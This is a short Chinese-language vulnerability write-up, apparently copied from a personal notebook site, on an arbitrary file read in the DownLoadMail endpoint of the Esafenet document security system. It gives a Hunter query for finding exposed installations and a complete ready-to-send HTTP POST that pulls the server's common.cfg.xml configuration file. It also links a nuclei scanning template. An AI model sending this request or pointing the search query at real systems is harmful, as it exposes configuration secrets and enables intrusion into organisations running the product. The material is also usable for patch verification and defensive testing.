# 亿赛通电子文档安全管理系统DownLoadMail存在任意文件读取漏洞

# 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统DownLoadMail存在任意文件读取漏洞。

# 二、影响版本
+ 亿赛通电子文档安全管理系统

# 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面

![1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6.png](./img/qzeKmVZUxpzWRkIb/1693912211487-1ee3eb84-62a3-4c32-806a-6be32537dfb6-916900.png)

# 四、漏洞复现
```plain
POST /CDGServer3/esafenet/DownLoadMail HTTP/1.1
Host: {hostname}
Cookie: JSESSIONID=F0F476C5479EB3F01A61D1C7DF8ECB3F; JSESSIONID=0F2F97A8E40DE2E33C5922685B1BACEC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

path=/WEB-INF/classes/&name=common.cfg.xml
```

![1703415481453-1b65cdf4-c6b9-46de-8457-e35141f47277.png](./img/qzeKmVZUxpzWRkIb/1703415481453-1b65cdf4-c6b9-46de-8457-e35141f47277-481265.png)

nuclei脚本

[亿赛通电子文档安全管理系统-downloadmail-文件读取.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1713621691094-966b96fe-5f06-4dd5-b160-becec33698b9.yaml)



> 更新: 2024-04-20 22:01:30  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/wdt0bxk0o0adw6zu>